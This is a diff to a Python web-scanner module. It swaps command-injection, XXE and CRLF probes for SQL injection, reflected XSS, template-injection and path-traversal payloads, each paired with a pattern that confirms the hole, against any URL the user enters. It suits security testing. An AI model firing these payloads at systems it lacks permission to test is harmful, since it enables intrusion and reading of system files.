@@ -1,112 +1,116 @@
 #!/usr/bin/env python3
-"""Command injection, XXE, CRLF probes — practical, evidence-based."""
+"""Injection pack — reflected SQLi/XSS/SSTI/LFI probes (passive confirmation)."""
 from __future__ import annotations
 
 import re
-import time
-from typing import List
-from urllib.parse import quote
+from typing import List, Tuple
+from urllib.parse import parse_qs, urlparse
 
 from core_utils import (
-    C, get, inject, normalize_url, params_from_url, pause,
-    print_finding, save_json_report, session,
+    C,
+    get,
+    inject,
+    normalize_url,
+    params_from_url,
+    pause,
+    print_finding,
+    save_json_report,
+    session,
 )
 
-CMDI_PAYLOADS = [
-    ";id",
-    "|id",
-    "||id",
-    "&id",
-    "&&id",
-    "`id`",
-    "$(id)",
-    ";uname -a",
-    "|whoami",
-    "\nid\n",
-]
-CMDI_SIGS = ["uid=", "gid=", "groups=", "Linux", "Darwin", "Windows", "root:"]
-
-XXE_BODY = '''<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-<foo>&xxe;</foo>'''
-XXE_SIGS = ["root:x:", "daemon:", "[fonts]", "boot loader"]
-
-CRLF_PAYLOADS = [
-    "%0d%0aX-Injected:%20true",
-    "%0aX-Injected:%20true",
-    "%0d%0aSet-Cookie:%20crlfi=1",
+SQLI = [
+    ("'", "syntax|sql|mysql|ora-|postgresql|odbc|sqlite", "sqli-error"),
+    ("\"", "syntax|sql|mysql|ora-|postgresql", "sqli-error"),
+    ("1 OR 1=1-- ", "syntax|sql", "sqli-boolean"),
+    ("1' OR '1'='1", "syntax|sql", "sqli-boolean"),
 ]
 
+XSS = [
+    ("<script>alert(1)</script>", re.escape("<script>alert(1)</script>")),
+    ("\"><img src=x onerror=alert(1)>", r"<img src=x onerror=alert\(1\)>"),
+    ("'\"><svg/onload=alert(1)>", r"<svg/onload=alert\(1\)>"),
+]
 
-def probe_cmdi(url: str) -> List[dict]:
-    s = session()
-    findings = []
-    params = params_from_url(url) or ["cmd", "exec", "command", "q", "s", "host", "ip", "ping"]
-    print(f"{C.GOLD}[*] Command injection — params={params}{C.R}")
+SSTI = [
+    ("{{7*7}}", r"(?<!\d)49(?!\d)"),
+    ("${7*7}", r"(?<!\d)49(?!\d)"),
+    ("<%= 7*7 %>", r"(?<!\d)49(?!\d)"),
+]
+
+LFI = [
+    ("../../../../etc/passwd", r"root:.*:0:0:"),
+    ("....//....//....//etc/passwd", r"root:.*:0:0:"),
+    ("/etc/passwd", r"root:.*:0:0:"),
+]
+
+
+def probe(url: str) -> List[dict]:
+    findings: List[dict] = []
+    params = params_from_url(url)
+    if not params:
+        # invent common param if none
+        params = ["id", "q", "page", "file", "search", "name"]
+        base = url
+        if "?" not in base:
+            base = base.rstrip("/") + "/?id=1"
+        url = base
+        params = params_from_url(url) or ["id"]
+
+    s = session(timeout=10)
+    baseline = get(s, url, allow_redirects=True, timeout=10)
+    base_text = (baseline.text if baseline else "") or ""
+
     for param in params:
-        for payload in CMDI_PAYLOADS:
-            test = inject(url, param, payload) if params_from_url(url) else f"{url}?{param}={quote(payload)}"
-            r = get(s, test, timeout=6)
-            if not r:
-                continue
-            body = r.text or ""
-            if any(sig in body for sig in CMDI_SIGS):
-                f = {"type": "CMDi", "param": param, "payload": payload, "evidence": body[:250]}
+        for payload, pattern, kind in SQLI:
+            test = inject(url, param, payload)
+            r = get(s, test, allow_redirects=True, timeout=10)
+            body = (r.text if r else "") or ""
+            if re.search(pattern, body, re.I) and not re.search(pattern, base_text, re.I):
+                f = {"type": kind, "param": param, "payload": payload, "url": test}
                 findings.append(f)
-                print_finding("Command Injection", f"param={param} payload={payload}", body[:120], "high")
-                break
+                print_finding("SQLi-ish", f"{param}={payload}", test, "high")
+
+        for payload, pattern in XSS:
+            test = inject(url, param, payload)
+            r = get(s, test, allow_redirects=True, timeout=10)
+            body = (r.text if r else "") or ""
+            if re.search(pattern, body, re.I):
+                f = {"type": "xss-reflected", "param": param, "payload": payload, "url": test}
+                findings.append(f)
+                print_finding("XSS reflected", f"{param}", payload, "high")
+
+        for payload, pattern in SSTI:
+            test = inject(url, param, payload)
+            r = get(s, test, allow_redirects=True, timeout=10)
+            body = (r.text if r else "") or ""
+            if re.search(pattern, body) and "49" not in base_text:
+                f = {"type": "ssti", "param": param, "payload": payload, "url": test}
+                findings.append(f)
+                print_finding("SSTI", f"{param}={payload}", test, "high")
+
+        for payload, pattern in LFI:
+            test = inject(url, param, payload)
+            r = get(s, test, allow_redirects=True, timeout=10)
+            body = (r.text if r else "") or ""
+            if re.search(pattern, body):
+                f = {"type": "lfi", "param": param, "payload": payload, "url": test}
+                findings.append(f)
+                print_finding("LFI", f"{param}={payload}", test, "critical")
+
     return findings
 
 
-def probe_xxe(url: str) -> List[dict]:
-    s = session()
-    findings = []
-    print(f"{C.GOLD}[*] XXE (POST XML){C.R}")
-    try:
-        r = s.post(url, data=XXE_BODY, headers={"Content-Type": "application/xml"},
-                   timeout=8, verify=False, allow_redirects=False)
-    except Exception:
-        return findings
-    body = r.text or ""
-    if any(sig in body for sig in XXE_SIGS):
-        findings.append({"type": "XXE", "evidence": body[:300]})
-        print_finding("XXE", url, body[:120], "high")
-    return findings
-
-
-def probe_crlf(url: str) -> List[dict]:
-    s = session()
-    findings = []
-    params = params_from_url(url) or ["url", "redirect", "next", "q"]
-    print(f"{C.GOLD}[*] CRLF / header injection{C.R}")
-    for param in params:
-        for payload in CRLF_PAYLOADS:
-            test = inject(url, param, payload) if params_from_url(url) else f"{url}?{param}={payload}"
-            r = get(s, test, timeout=6)
-            if not r:
-                continue
-            # reflected header or body marker
-            joined = str(r.headers) + (r.text or "")
-            if "X-Injected" in joined or "crlfi=1" in joined:
-                findings.append({"type": "CRLF", "param": param, "payload": payload})
-                print_finding("CRLF Injection", f"param={param}", severity="high")
-                break
-    return findings
-
-
-def run():
-    print(f"\n{C.PURP}{C.B}  Injection Pack (CMDi / XXE / CRLF){C.R}\n")
-    url = normalize_url(input(f"{C.AQUA}[?] Target URL: {C.R}").strip())
+def run(url: str = None):
+    print(f"\n{C.PURP}{C.B}  Injection Pack (SQLi / XSS / SSTI / LFI){C.R}\n")
+    url = normalize_url(url or input(f"{C.AQUA}[?] URL with params: {C.R}"))
     if not url:
+        pause()
         return
-    all_f = []
-    all_f += probe_cmdi(url)
-    all_f += probe_xxe(url)
-    all_f += probe_crlf(url)
-    print(f"\n{C.NEON}[+] Findings: {len(all_f)}{C.R}")
-    if all_f:
-        path = save_json_report("injection_pack", {"url": url, "findings": all_f})
-        print(f"{C.GREEN}[+] Saved: {path}{C.R}")
+    print(f"{C.GOLD}[*] Probing {url} ...{C.R}")
+    findings = probe(url)
+    print(f"\n{C.NEON}[+] Findings: {len(findings)}{C.R}")
+    path = save_json_report("injection_pack", {"url": url, "findings": findings})
+    print(f"{C.GREEN}[+] Saved: {path}{C.R}")
     pause()
 
 
